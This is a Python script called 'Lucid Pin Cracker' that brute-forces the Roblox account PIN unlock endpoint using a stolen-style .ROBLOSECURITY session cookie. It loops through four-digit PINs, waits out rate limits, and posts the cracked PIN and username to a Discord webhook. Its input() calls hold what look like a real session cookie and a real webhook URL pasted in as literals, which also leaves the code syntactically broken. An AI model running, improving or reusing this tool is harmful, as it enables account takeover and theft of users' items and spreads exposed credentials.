import requests
import re
import string
import time
import os

pingEveryone = True
print('')
print('Enter your cookie below:')
cookie = input(_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_D37F856CA86F5CA3E3CEC5BC1203F4918BABAA459EB95829C10878EF567922AA090E8F4FAA07DCED848ADBB3C3D7B7BB0EABF8E6C5147933A1383771B60A1C93BE2A286CD4FB9ADA1F2402306CA2A03FD9A81F7FB1AA380EEF28BB661DF2645CC14647B9D589ABDD1FC97F6DBB69361CD6F08C5B0FE1872811F89D0BAC22C9FBC163CC956AD3DAD6A4BCEAAC6F5C9F57280DD727043EA082817883D684DA067FAD25DF689717906E49A0909BA03006828E4F0C1F84173BA9D341B211D3F78D9F6791C55E863F8B8B2846DE1B33ADCD3D99BC6F6ABB11A9C93386F09FD9CBED759F2CC717861A31551EF4E476C7D197F6C6CBB7804F3034659EA0B961B61B385F5917CD49B365D5E9D61B09C4ACEC285E23D5F60C5588AF0EF0E1DACF1C6BD6E4F0373C610CF795115E3FC41E4A092C532D746D673F52764EAC24122C2204D5A974C71C25951D87F0CAF841E545A002549617D89120DE573E9C8D675F59FC8D558EBD6245)
os.system("cls")
print('')
print('Enter your webhook below:')
webhook = input(https://discord.com/api/webhooks/983612627836104714/ZOCvno_k9SmdqkMeZQZ-SUIBRS3RJPdavCogDL952IyyIjYiBHwZwyISkARnZS4W3FiV)
os.system("cls")
print('')
print('Should we ping Everyone?: ( y / n )')
pingEveryone = input(y)
os.system("cls")
if pingEveryone.lower == 'y' or pingEveryone == 'yes':
    ping = '@everyone'
else:
    ping = '***Pin Cracked!***'
os.system("cls")

print('''
  ██╗     ██╗   ██╗ █████╗ ██╗██████╗   ██████╗ ██╗███╗  ██╗
  ██║     ██║   ██║██╔══██╗██║██╔══██╗  ██╔══██╗██║████╗ ██║
  ██║     ██║   ██║██║  ╚═╝██║██║  ██║  ██████╔╝██║██╔██╗██║
  ██║     ██║   ██║██║  ██╗██║██║  ██║  ██╔═══╝ ██║██║╚████║
  ███████╗╚██████╔╝╚█████╔╝██║██████╔╝  ██║     ██║██║ ╚███║
  ╚══════╝ ╚═════╝  ╚════╝ ╚═╝╚═════╝   ╚═╝     ╚═╝╚═╝  ╚══╝

   █████╗ ██████╗  █████╗  █████╗ ██╗  ██╗███████╗██████╗ 
  ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
  ██║  ╚═╝██████╔╝███████║██║  ╚═╝█████═╝ █████╗  ██████╔╝
  ██║  ██╗██╔══██╗██╔══██║██║  ██╗██╔═██╗ ██╔══╝  ██╔══██╗
  ╚█████╔╝██║  ██║██║  ██║╚█████╔╝██║ ╚██╗███████╗██║  ██║
   ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n\n''')

url = 'https://auth.roblox.com/v1/account/pin/unlock'
token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
xcrsf = (token.headers['x-csrf-token'])
header = {'X-CSRF-TOKEN': xcrsf}

i = 0

for i in range(9999):
    try:
        pin = str(i).zfill(4)
        payload = {'pin': pin}
        r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
        if 'unlockedUntil' in r.text:
            print(f'Pin Cracked! Pin: {pin}')
            username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
            data = {
                "content" : ping,
                "username" : "Lucid Pin Cracker",
                "avatar_url" : "https://cdn.discordapp.com/attachments/857646271433801748/861595357778804756/lucidicon.png"
            }
            data["embeds"] = [
                {
                    "description" : f"{username}\'s Pin:\n```{pin}```",
                    "title" : "Cracked Pin!",
                    "color" : 0x00ffff,
                }
            ]

            result = requests.post(webhook, json = data)
            input('Press any key to exit')
            break
            
        elif 'Too many requests made' in r.text:
                
            print('  Ratelimited, trying again in 60 seconds..')
            time.sleep(60)
                
        elif 'Authorization' in r.text:
                
            print('  Error! Is the cookie valid?')
            break
            
        elif 'Incorrect' in r.text:
            print(f"  Tried: {pin} , Incorrect!")
            time.sleep(10)  
    except:
        print('  Error!')
    
input('\n  Press any key to exit')
        


        



    
        
            
        



